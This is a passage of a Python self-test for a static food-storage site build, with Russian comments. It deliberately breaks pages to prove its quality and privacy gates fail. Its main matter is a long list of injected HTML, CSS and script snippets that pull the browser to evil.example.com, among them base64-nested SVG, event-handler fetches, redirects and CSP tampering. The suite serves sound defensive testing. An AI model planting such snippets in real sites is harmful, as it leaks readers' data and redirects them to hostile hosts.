             '<span class="rk">%s</span>' % name_nm,
             '<span class="rk">No Such Food</span>', 1))),
        ("строки имён сверены с источником",
         lambda c: c.__setitem__(names_page, c[names_page].replace(
             '<ul class="rows" data-names="1">',
             '<ul class="rows" data-names="1"></ul>'
             '<ul class="rows" data-names="1">', 1))),
        ("строки имён сверены с источником", _drop_name_rows),
        # --- близнецы: каждая из трёх мерок и пустая выборка отдельно
        ("нет близнецов по прозе", _kill_own_prose),
        ("нет близнецов по прозе", _skeleton_twin),
        ("нет близнецов по прозе", _strip_h2),
        # --- близнецы по всему видимому тексту: пара, пропавший главный
        #     элемент и пустая выборка
        ("близнецы по всему видимому тексту",
         lambda c: c.__setitem__(twin_b, c[twin_a])),
        ("близнецы по всему видимому тексту",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '<main class="sheet">', '<div class="sheet">', 1))),
        ("близнецы по всему видимому тексту", _strip_html),
        # --- сроки заголовка и описания: чужое число в каждом из двух мест
        ("сроки заголовка и описания стоят величиной",
         lambda c: c.__setitem__(head_page, c[head_page].replace(
             "<title>%s" % head_title, "<title>%s" % head_lie, 1))),
        ("сроки заголовка и описания стоят величиной",
         lambda c: c.__setitem__(head_page, c[head_page].replace(
             'content="%s"' % head_desc, 'content="%s"' % head_desc_lie, 1))),
        ("сроки заголовка и описания стоят величиной", _strip_html),
        # --- части сигнатурного приёма: имя вне строки, строка без
        #     величины, подпись вне поля и пустая выборка
        ("части строки бланка стоят в строке",
         lambda c: c.__setitem__(names_page, c[names_page].replace(
             '<ul class="rows" data-names="1">',
             '<div data-names="1">', 1).replace("</ul>", "</div>", 1))),
        ("части строки бланка стоят в строке",
         lambda c: c.__setitem__(names_page, c[names_page].replace(
             '<span class="rv">%s</span>' % name_val, "", 1))),
        ("части строки бланка стоят в строке",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             "</body>", '<div class="cap">Loose</div></body>', 1))),
        ("части строки бланка стоят в строке", _strip_html),
        # --- молчание источника: выдуманное молчание, потерянная разбором
        #     ячейка и пустая выборка
        ("молчание источника подтверждено источником",
         lambda c: c.__setitem__(loud_page, c[loud_page].replace(
             "</body>",
             "<p>The USDA leaves it out: no pantry figure exists for it.</p>"
             "</body>", 1))),
        ("молчание источника подтверждено источником", _break_corpus_slot),
        ("молчание источника подтверждено источником", _strip_html),
        # --- реклама: место в месте, выход из потока, необъявленный
        #     обрезатель, столкновение в сетке и пустая выборка
        ("реклама не налезает и не обрезана",
         lambda c: c.__setitem__(prod_page, c[prod_page].replace(
             '<div class="label">',
             '<div class="label"><div class="ad ad-lead">'
             '<div class="ad ad-flow">x</div></div>', 1))),
        ("реклама не налезает и не обрезана", _break_ad_out_of_flow),
        ("реклама не налезает и не обрезана", _break_ad_clipper),
        ("реклама не налезает и не обрезана", _break_ad_grid),
        ("реклама не налезает и не обрезана", _strip_html),
        # --- поиск: страница без строки, строка в никуда и пустая выборка
        ("поиск находит каждую выпущенную страницу",
         lambda c: c.__setitem__("index.html", re.sub(
             r',\["[^"]+","/[^"]+/","[^"]*",\[[^]]*\]\]\]</script>',
             "]</script>", c["index.html"], count=1))),
        ("поиск находит каждую выпущенную страницу",
         lambda c: c.__setitem__("index.html", c["index.html"].replace(
             "]</script>", ',["Ghost","/ghost/","x",[]]]</script>', 1))),
        ("поиск находит каждую выпущенную страницу", _strip_html),
    ]

    # Опоры для двух новых гейтов. Ищутся В СОБРАННОМ по признаку.
    def _break_food_kind(_c):
        """Правило вердикта сломано: всё объявляется вкусовым окном.

        Ломается ФУНКЦИЯ, а не разметка: гейт проверяет свойства самого
        правила, и на сломанном правиле он обязан краснеть, даже если ни
        один байт страниц не изменился.
        """
        _SAVED["food_kind"] = fk.food_kind
        fk.food_kind = lambda it2, key, hi, st=None: (fk.QUALITY, "keeps")

    def _break_reason_clause(_c):
        """Объяснение подменено: все ветки печатают животную рамку.

        Ломается ФУНКЦИЯ. Страницы при этом не меняются ни на байт, и гейт,
        сверяющий напечатанное с правилом, обязан покраснеть именно поэтому:
        двенадцать растительных продуктов и получились из такой подстановки.
        """
        _SAVED["clause"] = fk.reason_clause
        fk.reason_clause = lambda reason, item=None, who=None: (
            "What decides that is the food and not the shelf the source "
            "files it on: %s is an animal food, or made with one."
            % (who or (item or {}).get("name") or "it"))

    def _break_cap(_c):
        """Порог слова «предел» сдвинут: месяцы снова объявляются пределом."""
        _SAVED["cap"] = fk.SAFETY_LIMIT_MAX_DAYS
        fk.SAFETY_LIMIT_MAX_DAYS = 1.0

    def _break_not_animal(_c):
        """Растительная метка стёрта: соевое молоко снова животная еда."""
        _SAVED["not_animal"] = fk.NOT_ANIMAL_WORDS
        fk.NOT_ANIMAL_WORDS = ()

    def _break_lead_ladder(_c):
        """Объявленное значение простого слова подменено: за страницу яиц
        объявлены сырые белки, и известный ответ обязан покраснеть."""
        _SAVED["plain"] = dict(fk.PLAIN_MEANS)
        fk.PLAIN_MEANS["eggs"] = "22"

    def _break_plain_key(_c):
        """В таблице осталось имя, которого в снимке нет одной строкой."""
        _SAVED["plain"] = dict(fk.PLAIN_MEANS)
        fk.PLAIN_MEANS["unobtainium sandwich"] = "1"

    # Страница, чей вкусовой вердикт стои́т на коротком холодном окне: только
    # на такой напечатанный признак обязан быть, и только на ней его пропажа
    # обязана краснеть.
    cold_q = next(
        p for p, t2 in sorted(prods.items())
        for it2 in [_corp.get(p[:-len("/index.html")])]
        if it2
        for cell in [_signal_cell(it2)]
        if cell and cell[2].startswith("fridge") and cell[4] is not None
        and cell[4] <= fk.COLD_SHORT_DAYS
        and _kind_of(it2, cell[2], cell[4], cell[1]) == "quality")
    cold_why = unescape(fk.REASON_EN[fk.food_kind(
        _corp[cold_q[:-len("/index.html")]],
        _signal_cell(_corp[cold_q[:-len("/index.html")]])[2],
        _signal_cell(_corp[cold_q[:-len("/index.html")]])[4],
        _signal_cell(_corp[cold_q[:-len("/index.html")]])[1])[1]])
    # Многосоставная страница: подпись сигнального поля называет на ней вид,
    # и только на такой подмена вида обязана краснеть.
    multi_page = next(
        p for p, t2 in sorted(prods.items())
        for it2 in [_corp.get(p[:-len("/index.html")])]
        if it2 and len(pr.states_of(it2)) > 1
        and re.search(r'<div class="hot"><div class="cap">', t2))
    multi_cap = re.search(r'<div class="hot"><div class="cap">(.*?)</div>',
                          prods[multi_page], re.S).group(1)

    # Опоры для гейта согласия фразы с видом. Ищутся В СОБРАННОМ по
    # признаку: вписанное имя страницы переживает не всякую пересборку
    # корпуса, а поломка, промахнувшаяся мимо цели, оставляет гейт
    # непроверенным и выглядит как пройденная самопроверка.
    belt_page, belt_val = next(
        (p, m.group(1)) for p, t2 in sorted(prods.items())
        for m in [re.search(r"keeps ([^,]+), " + re.escape(pr.BELT_TAIL),
                            _visible(t2))] if m)
    speaks_page, speaks_txt, speaks_who = next(
        (p, m.group(0), m.group(1)) for p, t2 in sorted(prods.items())
        for m in [re.search(r'computed for (.+?), which is the kind the '
                            r'plain name means here', t2)] if m)
    split_page = next(p for p, t2 in sorted(prods.items())
                      if 'class="hot" data-pick' in t2
                      and "so this page prints no single figure" in t2)

    # Опоры гейта согласия вердикта и объяснения. Ищутся В СОБРАННОМ по
    # признаку: вписанное имя страницы переживает не всякую пересборку
    # корпуса, а поломка, промахнувшаяся мимо цели, оставляет гейт
    # непроверенным и выглядит как пройденная самопроверка.
    def _own_clause(slug):
        it3 = _corp.get(slug)
        cell3 = _signal_cell(it3) if it3 else None
        if not cell3:
            return None
        _i3, st3, key3, _lo3, hi3 = cell3
        return unescape(fk.reason_clause(
            fk.food_kind(it3, key3, hi3, st3)[1], it3,
            pr.brief_who(it3, st3)))

    why_page, why_text = next(
        (p, s) for p in sorted(prods)
        for s in [_own_clause(p[:-len("/index.html")])]
        if s and s in prods[p])
    # Страница, чьей еде правило НИКОГДА не говорит «животная»: только на
    # такой подброшенное объяснение обязано краснеть.
    no_animal_page = next(
        p for p in sorted(prods)
        for it3 in [_corp.get(p[:-len("/index.html")])]
        if it3 and "animal" not in {
            fk.food_kind(it3, k4, v4[1], s4)[1]
            for s4 in pr.states_of(it3)
            for k4, v4 in s4["slots"].items() if v4 and v4[0] != "no"})
    hub_key = "past-the-date/index.html"
    hub_line = re.search(r"Of the [0-9]+ food pages on this site, [0-9]+ "
                         r"lead with a safety limit", files[hub_key]).group(0)
    hub_bad = re.sub(r"(, )([0-9]+)( lead)",
                     lambda mm: "%s%d%s" % (mm.group(1), int(mm.group(2)) + 1,
                                            mm.group(3)), hub_line)

    breaks += [
        ("объяснение и вердикт из одного признака", _break_reason_clause),
        ("объяснение и вердикт из одного признака", _break_cap),
        ("объяснение и вердикт из одного признака", _break_not_animal),
        ("объяснение и вердикт из одного признака",
         lambda c: c.__setitem__(why_page, c[why_page].replace(
             why_text, "", 1))),
        ("объяснение и вердикт из одного признака",
         lambda c: c.__setitem__(no_animal_page, c[no_animal_page].replace(
             "</body>", "<p>Anything is an animal food, or made with "
             "one.</p></body>", 1))),
        ("объяснение и вердикт из одного признака",
         lambda c: c.__setitem__(hub_key, c[hub_key].replace(
             hub_line, hub_bad, 1))),
        ("объяснение и вердикт из одного признака", _strip_html),
        ("вердикт выведен из еды, а не из папки", _break_food_kind),
        ("вердикт выведен из еды, а не из папки",
         lambda c: c.__setitem__(cold_q, c[cold_q].replace(cold_why, "", 1))),
        ("вердикт выведен из еды, а не из папки", _strip_html),
        ("за страницу отвечает ведущее состояние", _break_lead_ladder),
        ("за страницу отвечает ведущее состояние", _break_plain_key),
        ("за страницу отвечает ведущее состояние",
         lambda c: c.__setitem__(multi_page, c[multi_page].replace(
             '<div class="hot"><div class="cap">%s</div>' % multi_cap,
             '<div class="hot"><div class="cap">Nobody in particular</div>',
             1))),
        ("за страницу отвечает ведущее состояние", _strip_html),
        # Ремень безопасности вернулся ПЕРЕД ответом — ровно тот дефект,
        # которым починка яиц стала сама: первое число страницы принадлежит
        # чужому виду.
        ("сказанное о выборе вида совпадает с видом",
         lambda c: c.__setitem__(belt_page, c[belt_page].replace(
             '<div class="hot">',
             '<div class="sub">Shorter kind: %s</div><div class="hot">'
             % pr.esc(belt_val) + "", 1))),
        # Фраза называет один вид, подпись поля — другой.
        ("сказанное о выборе вида совпадает с видом",
         lambda c: c.__setitem__(speaks_page, c[speaks_page].replace(
             speaks_txt, speaks_txt.replace(speaks_who,
                                            "Nobody in particular", 1), 1))),
        # Обещание, которое было неверно на тринадцати страницах, вернулось.
        ("сказанное о выборе вида совпадает с видом",
         lambda c: c.__setitem__(speaks_page, c[speaks_page].replace(
             "</main>", "<p>Computed for the kind the source lists first.</p>"
             "</main>", 1))),
        # Страница-выбор молча назвала вид.
        ("сказанное о выборе вида совпадает с видом",
         lambda c: c.__setitem__(split_page, c[split_page].replace(
             "so this page prints no single figure", "so this page says so",
             1))),
        ("сказанное о выборе вида совпадает с видом", _strip_html),
    ]


    # ------------------------------------------- ПОЛНОТА СПИСКА НЕСУЩИХ
    # На КАЖДЫЙ ключ render.FETCH_CARRIERS здесь написан РУКАМИ кусок
    # разметки, уводящий браузер на чужой хост, и гейт обязан покраснеть на
    # каждом. Куски написаны по перечню URL-несущих атрибутов HTML, а не по
    # проверяемому списку: таблица, выведенная из проверяемого объявления,
    # согласна с ним по построению и ничего не доказывает. Ключ, у которого
    # здесь нет поломки, роняет самопроверку.
    #
    # ЗАМЕР ДО ПРАВКИ, ради которого всё это и написано: из тридцати пяти
    # способов утащить браузер прежний гейт ловил пять, и один из пойманных
    # был случайностью соседнего гейта. Мимо шли протокол-относительные
    # `img`, `iframe`, `link`, `url()` и даже `<script src="//evil">`.
    _EVIL = "//evil.example.com"
    _EVIL_H = "https://evil.example.com"
    _BS = chr(92) * 2
    # base64 объявляет сам адрес, и развернуть его — работа БРАУЗЕРА.
    # Ровно та же нагрузка в процентах ловилась строкой ниже: один и тот же
    # гейт доказывал и умысел, и свой обход.
    _B64_EVIL = base64.b64encode(
        ('<svg xmlns="http://www.w3.org/2000/svg"><image href="%s/x.png"/>'
         "</svg>" % _EVIL_H).encode("utf-8")).decode("ascii")
    _B64_INNER = base64.b64encode(
        ('<use href="%s/x"/>' % _EVIL_H).encode("utf-8")).decode("ascii")
    # Обёртка внутри обёртки: снаружи ни одной метки, весь запрос — во
    # второй развёртке.
    _B64_NEST = base64.b64encode(
        ("<svg>data:image/svg+xml;base64,%s</svg>" % _B64_INNER)
        .encode("utf-8")).decode("ascii")
    FETCH_BREAKS = (
        ("src", '<img src="%s/p.gif">' % _EVIL),
        ("src", '<script src="%s/s.js"></script>' % _EVIL),
        ("src", '<iframe src="%s/f"></iframe>' % _EVIL),
        ("src", "<img src='%s/q.gif'>" % _EVIL),           # одинарные кавычки
        ("src", "<img src=%s/r.gif>" % _EVIL),             # вовсе без кавычек
        ("src", '<img src="evil.example.com/p.gif">'),   # хост без схемы
        ("src", '<img src="%sevil.example.com/p.gif">' % _BS),
        ("src", '<img src="https://keepsuntil.com.evil.example.com/x.png">'),
        ("src", '<video><track src="%s/t.vtt"></video>' % _EVIL),
        ("srcset", '<img srcset="%s/a.png 1x, /b.png 2x">' % _EVIL),
        ("srcset", '<picture><source srcset="%s/s.webp"></picture>' % _EVIL),
        ("imagesrcset",
         '<link rel="preload" as="image" imagesrcset="%s/i.png 1x">' % _EVIL),
        ("link_href", '<link rel="stylesheet" href="%s/s.css">' % _EVIL),
        ("link_href", '<link rel="preconnect" href="%s">' % _EVIL),
        ("link_href",
         '<link rel="icon" href="data:image/svg+xml,'
         '%3Csvg%3E%3Cimage href=%27https://evil.example.com/x%27/%3E'
         '%3C/svg%3E">'),
        ("link_href", '<link rel="icon" href="data:text/html,%3Cb%3E">'),
        ("base_href", '<base href="%s/">' % _EVIL_H),
        ("svg_href", '<svg><use href="%s/s.svg#i"></use></svg>' % _EVIL),
        ("xlink_href", '<svg><use xlink:href="%s/s.svg#i"></use></svg>' % _EVIL),
        ("a_href", '<a href="%s/">x</a>' % _EVIL_H),
        ("a_href", '<a href="javascript:fetch(0)">x</a>'),
        # Цитата на источник ПО КЛИКУ разрешена, а тот же адрес с
        # rel=preconnect — уже загрузка, и она запрещена. Поломка, которая
        # краснела бы и у соседней несущей, ничего про свою не доказывает.
        ("a_rel_fetch", None),
        ("object_data", '<object data="%s/x.swf"></object>' % _EVIL),
        ("object_legacy", '<object codebase="%s/cb"></object>' % _EVIL),
        ("object_legacy", '<object classid="%s/cid"></object>' % _EVIL),
        ("object_archive",
         '<object archive="/ok.jar %s/b.jar"></object>' % _EVIL),
        ("poster", '<video poster="%s/p.jpg"></video>' % _EVIL),
        ("form_action", '<form action="%s/go"></form>' % _EVIL),
        ("formaction", '<button formaction="%s/go">x</button>' % _EVIL),
        ("formaction", '<input type="submit" formaction="%s/go">' % _EVIL),
        ("background", '<table background="%s/bg.png"></table>' % _EVIL),
        ("cite", '<blockquote cite="%s/c">x</blockquote>' % _EVIL),
        ("ping", '<a href="/" ping="/ok %s/t">x</a>' % _EVIL),
        ("longdesc", '<img src="/x.png" longdesc="%s/d.html">' % _EVIL),
        ("usemap", '<img src="/x.png" usemap="%s/m">' % _EVIL),
        ("manifest", '<html manifest="%s/m.appcache">' % _EVIL),
        ("profile", '<head profile="%s/p">' % _EVIL),
        ("legacy_img", '<img src="/x.png" lowsrc="%s/l.gif">' % _EVIL),
        ("legacy_img", '<img src="/x.png" dynsrc="%s/d.avi">' % _EVIL),
        ("srcdoc",
         '<iframe srcdoc="&lt;img src=&quot;%s/x&quot;&gt;"></iframe>' % _EVIL),
        ("style_attr",
         '<div style="background-image:url(%s/d.png)"></div>' % _EVIL),
        ("meta_url",
         '<meta http-equiv="refresh" content="0;url=%s/">' % _EVIL),
        ("meta_url", '<meta property="og:image" content="%s/o.png">' % _EVIL),
        ("css_url", "<style>b{background:url(%s/b.png)}</style>" % _EVIL),
        ("css_url",
         "<style>@font-face{font-family:x;src:url(%s/f.woff2)}</style>" % _EVIL),
        ("css_import", '<style>@import "%s/i.css";</style>' % _EVIL),
        ("css_import", "<style>@import url(%s/j.css);</style>" % _EVIL),
        ("importmap",
         '<script type="importmap">{"imports":{"a":"%s/m.js"}}</script>'
         % _EVIL),
        ("css_url",
         '<style>b{background:image-set("%s/i.png" 1x)}</style>' % _EVIL),
        ("css_url",
         "<style>b{background:-webkit-image-set('%s/w.png' 2x)}</style>"
         % _EVIL),
        # Один и тот же приём в АТРИБУТЕ, в двух записях сразу: с кавычкой
        # мнемоникой и с одинарной. Ловилась только вторая.
        ("style_attr",
         '<div style="background:image-set(&quot;%s/s.png&quot; 1x)"></div>'
         % _EVIL),
        ("style_attr",
         '<div style=' + _A + 'background:image-set("%s/t.png" 1x)' % _EVIL
         + _A + '></div>'),
        # Статический import — тот же запрос, что динамический, и скобки в
        # нём нет.
        ("js_fetch",
         '<script type="module">import x from "%s/m.js";</script>' % _EVIL),
        ("js_fetch",
         '<script type="module">export * from "%s/m.js";</script>' % _EVIL),
        ("js_fetch", '<script>import "%s/m.js"</script>' % _EVIL),
        # Уход страницы целиком: уезжает не запрос, а читатель.
        ("js_fetch", '<script>location="%s/go"</script>' % _EVIL),
        ("js_fetch", '<script>location.href="%s/go"</script>' % _EVIL),
        ("js_fetch", '<script>location.assign("%s/go")</script>' % _EVIL),
        ("js_fetch", '<script>location.replace("%s/go")</script>' % _EVIL),
        ("js_fetch", '<script>window.open("%s/go")</script>' % _EVIL),
        ("js_fetch", '<script>fetch("%s/beacon")</script>' % _EVIL),
        ("js_fetch", "<script>var i=new Image();i.src=x</script>"),
        ("js_fetch", '<script>navigator.sendBeacon("/x")</script>'),
        # ------------------------------ ВТОРАЯ АТАКА: четверо мимо гейта
        # Обёртка base64 у той же встроенной картинки.
        ("link_href",
         '<link rel="icon" href="data:image/svg+xml;base64,%s">' % _B64_EVIL),
        ("src", '<img src="data:image/svg+xml;base64,%s">' % _B64_EVIL),
        ("src", '<img src="data:image/svg+xml;base64,%s">' % _B64_NEST),
        # Атрибут-обработчик — это скрипт. Уводит он либо запрос, либо
        # самого читателя, и второе для обещания приватности хуже.
        ("on_event", '<div onclick="fetch(%s%s/b%s)">x</div>'
         % (chr(39), _EVIL, chr(39))),
        ("on_event", '<div onmouseover="location=%s%s/go%s">x</div>'
         % (chr(39), _EVIL, chr(39))),
        ("on_event", '<img src="/x.png" onerror="new Image().src=u">'),
        # Значение параметра объекта: несущей оно объявлено не было.
        ("param_value",
         '<object><param name="movie" value="%s/x.swf"></object>' % _EVIL),
        # Правила предзагрузки: браузер уходит по ним сам и до клика.
        ("speculationrules",
         '<script type="speculationrules">{"prerender":[{"urls":["%s/"]}]}'
         "</script>" % _EVIL),
        # Отчёт самой политики безопасности.
        ("csp_report",
         '<meta http-equiv="Content-Security-Policy" content="default-src '
         "%snone%s; report-uri %s/r%s>" % (chr(39), chr(39), _EVIL, chr(34))),
        # SMIL подменяет адрес уже нарисованной картинке.
        ("svg_animate",
         '<svg><image href="/x.png"><animate attributeName="href" '
         'to="%s/y.png"/></image></svg>' % _EVIL),
    )
    assert {k for k, _s in FETCH_BREAKS} == {c[0] for c in rd.FETCH_CARRIERS},\
        ("поломки не покрывают объявленные несущие: без поломки %s, лишние %s"
         % ({c[0] for c in rd.FETCH_CARRIERS} - {k for k, _s in FETCH_BREAKS},
            {k for k, _s in FETCH_BREAKS} - {c[0] for c in rd.FETCH_CARRIERS}))

    def _inject(snippet):
        def fn(c):
            c[any_page] = c[any_page].replace(
                "</body>", snippet + "</body>", 1)
        # МЕТКА. Поломок под именем «браузер не ходит наружу» теперь полсотни,
        # и «ГЕЙТ НЕ СРАБОТАЛ» без метки — провал, который негде искать.
        fn.label = snippet[:64]
        return fn

    for _key, _snip in FETCH_BREAKS:
        if _snip is None:
            continue
        breaks.append(("браузер не ходит наружу", _inject(_snip)))
    # Отдельно: адрес источника ПО КЛИКУ законен, он же с rel=preconnect —
    # загрузка. Собирается из объявления сборки, а не вписан руками: адрес
    # источника переживает не всякую правку render.py.
    breaks.append(("браузер не ходит наружу", _inject(
        '<a href="%s" rel="preconnect">x</a>'
        % sorted(_outbound_allowed())[0])))
    # ПУСТАЯ ВЫБОРКА. Прежняя поломка убирала страницы и доказывала
    # пустую выборку, пока гейт читал один `.html`. Теперь он читает КАЖДЫЙ
    # отданный файл: карта сайта и robots держали бы выборку непустой, и
    # поломка тихо перестала бы ломать. Пустой обязана быть вся выкладка.
    def _strip_all(c):
        for k2 in list(c):
            c.pop(k2)
    _strip_all.label = "выкладка пуста: пустая выборка обязана краснеть"
    breaks.append(("браузер не ходит наружу", _strip_all))

    def _add_file(path, text, label):
        """Файл, которого в сборке не было. Гейт читал `.html` и только его:
        файл стиля, картинка SVG, скрипт файлом и данные уехали бы на сайт
        непрочитанными, а непрочитанный файл выглядит ровно как чистый."""
        def fn(c):
            c[path] = text
        fn.label = label
        return fn

    for _p2, _t2, _lab in (
            ("style.css", "b{background:url(%s/b.png)}" % _EVIL,
             "отдан файл стиля с чужим url()"),
            ("style.css", '@import "%s/i.css";' % _EVIL,
             "отдан файл стиля с чужим @import"),
            ("style.css", 'b{background:image-set("%s/s.png" 1x)}' % _EVIL,
             "отдан файл стиля с чужим image-set"),
            ("logo.svg",
             '<svg xmlns="http://www.w3.org/2000/svg">'
             '<image href="%s/x.png"/></svg>' % _EVIL,
             "отдана картинка SVG с чужим href"),
            ("app.js", 'fetch("%s/beacon")' % _EVIL,
             "отдан скрипт файлом с fetch()"),
            ("app.js", 'import x from "%s/m.js"' % _EVIL,
             "отдан скрипт файлом со статическим import"),
            ("data.json", '{"a":"%s/x"}' % _EVIL_H,
             "отданы данные с чужим адресом"),
            ("logo.webp", "RIFF0000WEBP",
             "отдан файл с расширением, которого нет в объявлении")):
        breaks.append(("браузер не ходит наружу",
                       _add_file(_p2, _t2, _lab)))

    def _break_sitemap_outside(c):
        """Чужой адрес в КАРТЕ САЙТА: гейт её не читал вовсе."""
        k2 = next(x for x in c if x.endswith("sitemap.xml"))
        c[k2] = c[k2].replace(
            "</urlset>",
            "<url><loc>%s/</loc></url></urlset>" % _EVIL_H, 1)
    breaks.append(("браузер не ходит наружу", _break_sitemap_outside))

    def _break_robots_outside(c):
        """Чужой адрес в robots.txt — тот же класс, другой файл."""
        k2 = next(x for x in c if x.endswith("robots.txt"))
        c[k2] = c[k2] + "\nSitemap: %s/s.xml\n" % _EVIL_H
    breaks.append(("браузер не ходит наружу", _break_robots_outside))

    breaks.append(("свой ресурс существует",
                   _add_file("style.css", "b{background:url(/no-such.png)}",
                             "отдан файл стиля с путём в никуда")))

    # ----------------------------------- поломки гейта видов отданных файлов
    def _served_ghost(_c):
        """В объявление приехал вид разбора, которого сканер не знает."""
        _SAVED["served"] = rd.SERVED_KINDS
        rd.SERVED_KINDS = rd.SERVED_KINDS + (
            (".woff2", "шрифт", "вид, которого никто не читает"),)

    def _served_empty(_c):
        """Объявление опустело: пустая выборка обязана краснеть."""
        _SAVED["served"] = rd.SERVED_KINDS
        rd.SERVED_KINDS = ()

    def _served_mute(_c):
        """Вид объявлен без причины словами: описанный и необъяснённый
        рычаг — половина рычага."""
        _SAVED["served"] = rd.SERVED_KINDS
        rd.SERVED_KINDS = tuple((e, k, "" if e == ".css" else w)
                                for e, k, w in rd.SERVED_KINDS)

    def _served_dup(_c):
        """Одно расширение объявлено дважды и разными видами."""
        _SAVED["served"] = rd.SERVED_KINDS
        rd.SERVED_KINDS = rd.SERVED_KINDS + (
            (".html", "urls", "второе объявление того же расширения"),)

    def _served_blind(_c):
        """Сканер разучился читать ОДИН объявленный вид: ровно этим и был
        прежний гейт — список в голове длиннее списка в коде."""
        _SAVED["file_points"] = _file_points
        real = _file_points

        def blind(path, t):
            if _serve_kind(path) == "css":
                return []
            return real(path, t)
        globals()["_file_points"] = blind

    for _fn2 in (_served_ghost, _served_empty, _served_mute, _served_dup,
                 _served_blind):
        breaks.append(("каждый отданный файл разобран по своему виду", _fn2))
    breaks.append(("каждый отданный файл разобран по своему виду",
                   _add_file("logo.webp", "RIFF0000WEBP",
                             "отдан файл с необъявленным расширением")))

    def _break_carrier_blind(_c):
        """Сканер разучился читать ОДНУ объявленную несущую. Ровно этим и
        был прежний гейт: список в голове длиннее списка в коде."""
        _SAVED["fetch_points"] = _fetch_points
        real = _fetch_points

        def blind(t, carriers, depth=0):
            return [x for x in real(t, carriers, depth) if x[0] != "poster"]
        globals()["_fetch_points"] = blind

    def _break_carrier_kind(_c):
        """В объявление приехала несущая, вида которой сканер не знает."""
        _SAVED["carriers"] = rd.FETCH_CARRIERS
        rd.FETCH_CARRIERS = rd.FETCH_CARRIERS + (
            ("ghost", ("ghostsrc",), None, "выдуманный вид", "призрак"),)

    def _break_carrier_empty(_c):
        """Список несущих опустел: пустая выборка обязана краснеть."""
        _SAVED["carriers"] = rd.FETCH_CARRIERS
        rd.FETCH_CARRIERS = ()

    def _break_policy_pixel(c):
        """Счётчик приехал КАРТИНКОЙ, а не скриптом: политика продолжает
        отрицать внешние загрузки, и прежний гейт молчал — он читал ровно
        `<script src>`, одну несущую из двадцати девяти."""
        c[any_page] = c[any_page].replace(
            "</body>", '<img src="%s/pixel.gif"></body>' % "//evil.example.com",
            1)

    def _break_policy_ways(c):
        """Политика назвала другое число способов уйти наружу."""
        pv = "privacy/index.html"
        want = ("the %d kinds of address-carrying construct"
                % len(rd.FETCH_CARRIERS))
        assert want in c[pv], "поломка политики промахнулась мимо цели"
        c[pv] = c[pv].replace(want, want.replace(
            str(len(rd.FETCH_CARRIERS)), str(len(rd.FETCH_CARRIERS) + 1)), 1)

    def _break_policy_quotes(c):
        """Внешний скрипт в ОДИНАРНЫХ кавычках. Сторона «политика отрицает
        внешние скрипты» читала регулярку на двойные и видела одну запись из
        трёх — тот же дефект, что уже чинили в g_scripts."""
        c[any_page] = c[any_page].replace(
            "</body>",
            "<script src=" + _A + "//evil.example.com/a.js" + _A
            + "></script></body>", 1)

    def _break_policy_kinds(c):
        """Политика назвала другое число ВИДОВ отданных файлов."""
        pv = "privacy/index.html"
        want = "all %d file formats it knows" % len(rd.SERVED_KINDS)
        assert want in c[pv], "поломка промахнулась мимо числа видов"
        c[pv] = c[pv].replace(want, want.replace(
            str(len(rd.SERVED_KINDS)), str(len(rd.SERVED_KINDS) + 1)), 1)

    def _csp_strip(c):
        """Политика пропала со страницы. Ровно так выглядит забытая
        перевёрстка: страница цела, а браузеру больше никто ничего не
        говорит."""
        c[any_page] = re.sub(
            r'<meta http-equiv="Content-Security-Policy"[^>]*>', "",
            c[any_page], count=1)

    def _csp_wrong_hash(c):
        """Хэш в политике не тот, что у скрипта страницы. ГЛАВНАЯ ПОЛОМКА
        ЗДЕСЬ: именно так строгая политика дважды молча убивала счётчик на
        этой ферме — гейты зелёные, отданные байты совпадают с собранными, а
        скрипт в браузере не выполняется вовсе."""
        m = re.search(r"'sha256-([A-Za-z0-9+/=]+)'", c[any_page])
        assert m, "поломка политики промахнулась мимо хэша"
        h = m.group(1)
        c[any_page] = c[any_page].replace(
            h, ("B" if h[0] != "B" else "C") + h[1:], 1)

    def _csp_host_injected(c):
        """Хост дописал скрипт в готовую страницу — то, ради чего политика и
        стоит. Сборка обязана краснеть здесь, а не рассчитывать на то, что
        браузер читателя его не выполнит."""
        c[any_page] = c[any_page].replace(
            "</body>", "<script>void 0</script></body>", 1)

    def _csp_unsafe(_c):
        """В объявление приехал 'unsafe-inline' — ровно то, ради чего вся
        политика и написана."""
        _SAVED["csp"] = rd.CSP_POLICY
        rd.CSP_POLICY = tuple(
            (d, (s + ("'unsafe-inline'",)) if d == "script-src" else s, t, w)
            for d, s, t, w in rd.CSP_POLICY)

    def _csp_ignored_directive(_c):
        """Директива, которую браузер в <meta> выбрасывает: описанный и
        несуществующий рычаг хуже отсутствующего."""
        _SAVED["csp"] = rd.CSP_POLICY
        rd.CSP_POLICY = rd.CSP_POLICY + (
            ("frame-ancestors", ("'none'",), None, "рычаг, которого нет"),)

    def _csp_orphan_carrier(_c):
        """Несущая добавлена в таблицу и не названа в политике: таблица и
        политика разошлись бы МОЛЧА, и обе выглядели бы целыми."""
        _SAVED["carriers"] = rd.FETCH_CARRIERS
        rd.FETCH_CARRIERS = rd.FETCH_CARRIERS + (
            ("ghost", ("ghostsrc",), None, "url", "призрак"),)

    def _csp_ghost_directive(_c):
        """Несущая отнесена к директиве, которой в политике нет."""
        _SAVED["governs"] = dict(rd.CSP_GOVERNS)
        rd.CSP_GOVERNS["src"] = ("font-src", "такой директивы в политике нет")

    def _csp_mute_reason(_c):
        """Несущую объявили незакрываемой и не сказали почему."""
        _SAVED["governs"] = dict(rd.CSP_GOVERNS)
        rd.CSP_GOVERNS["cite"] = (None, "")

    for _fn3 in (_csp_strip, _csp_wrong_hash, _csp_host_injected, _csp_unsafe,
                 _csp_ignored_directive, _csp_orphan_carrier,
                 _csp_ghost_directive, _csp_mute_reason, _strip_html):
        breaks.append(("политика безопасности закрывает несущие", _fn3))

    def _break_policy_claim_gone(c):
        """Страница перестала печатать обещание, которое сборка держит.
        Прежний гейт читал это как «отрицать нечего» и зеленел: сторона
        «политика → разметка» была тремя литералами, вписанными в гейт."""
        pv = "privacy/index.html"
        want = "No third-party script loads on any page"
        assert want in c[pv], "поломка промахнулась мимо обещания"
        c[pv] = c[pv].replace(
            want, "Third-party scripts are kept to a minimum", 1)

    def _break_policy_csp_gone(c):
        """Политика безопасности исчезла со всех страниц, а страница
        приватности продолжает её обещать."""
        for k3 in list(c):
            if k3.endswith(".html"):
                c[k3] = re.sub(
                    r'<meta http-equiv="Content-Security-Policy"[^>]*>', "",
                    c[k3])

    breaks += [
        ("политика совпадает с разметкой", _break_policy_claim_gone),
        ("политика совпадает с разметкой", _break_policy_csp_gone),
